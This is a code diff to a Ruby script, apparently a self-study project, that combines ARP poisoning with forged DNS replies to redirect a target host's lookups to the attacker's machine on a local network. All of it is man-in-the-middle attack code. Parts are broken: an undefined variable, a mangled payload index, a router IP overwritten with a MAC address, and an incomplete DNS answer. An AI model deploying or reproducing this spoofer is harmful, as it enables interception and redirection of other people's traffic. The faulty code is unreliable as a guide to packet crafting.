@@ -6,6 +6,15 @@ require 'thread'
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread. 
 
+
+## User defined variables
+@target_ip   = "192.168.1.101"  # IP of the host you would like to target
+@sender_ip   = "192.168.1.100"  # Your IP, or the attacking IP (MITM)
+@router_ip   = "192.168.1.1"    # IP of the router on the network to ARP Poison
+@iface       = "wlp2s0"         # Name of the primary network interface 
+
+## DO NOT EDIT BELOW THIS LINE
+# Functions
 def runspoof(arp_packet_target,arp_packet_router)
   # Send out both packets
   puts "Spoofing...."
@@ -32,13 +41,17 @@ def spoof_dns(t_ip)
   cap.stream.each do |p|
     pkt = PacketFu::Packet.parse(p)
     if pkt.is_udp?
-      dns_packet = pkt.payload[2].to_s + pkt.payload[3].to_s
+      dns_hdr_flag = pkt.payload[2].to_s + pkt.payload[3].to_s
 
       #check if query
-      #extract domain name
-      #build response
-      #send response
+      if dns_hdr_flag == '10'
+        #extract domain name
+        domain_name = extract_domain(pkt.payload[3.to_s])
+        puts "Domain name is: #{name}"
 
+        #build and send response
+        send_dns_response(pkt, domain_name)
+      end
     end
   end
 end
@@ -65,22 +78,25 @@ def send_dns_response(orig_pkt, name)
 
   #UDP/IP headers
   dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
-  dns_resp.udp_src = orig_pkt.udp_dst
+  dns_resp.eth_saddr = @sender_mac
+  dns_resp.eth_daddr = @target_mac
   dns_resp.udp_dst = orig_pkt.udp_src
+  dns_resp.udp_src = orig_pkt.udp_dst
   dns_resp.ip_saddr = orig_pkt.ip_daddr
   dns_resp.ip_daddr = @target_ip
-  dns_resp.eth_daddr = @target_mac
 
   #DNS header
   #copy transaction ID from original query to response
   dns_resp.payload = orig_pkt.payload[0,2]
   #response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
 
-  #Name
-
-  #Spoofed IP
+  #Domain Name
 
   #Rest of DNS Header (defaults)
+
+  #Spoofed IP
+  ip_ary = @sender_ip.split('.')
+  dns_resp.payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')
 
   #Bundle and send
   dns_resp.recalc
@@ -88,17 +104,12 @@ def send_dns_response(orig_pkt, name)
 end
 
 ## Main
-# replace with cmd line or config file?
-@target_ip   = "192.168.1.101"
-@sender_ip   = "192.168.1.100"
-@router_ip   = "192.168.1.1"
-
 =begin
 @target_mac  = "b8:ac:6f:34:ad:d8"
 @sender_mac  = "7c:7a:91:7d:2b:02"
 @router_mac  = "00:22:6b:7c:9b:12"
 =end
-@iface      = "wlp2s0"
+
 @target_mac = get_machine_addr(@target_ip)
 @sender_mac = get_machine_addr(@sender_ip)
 @router_ip  = get_machine_addr(@router_ip)
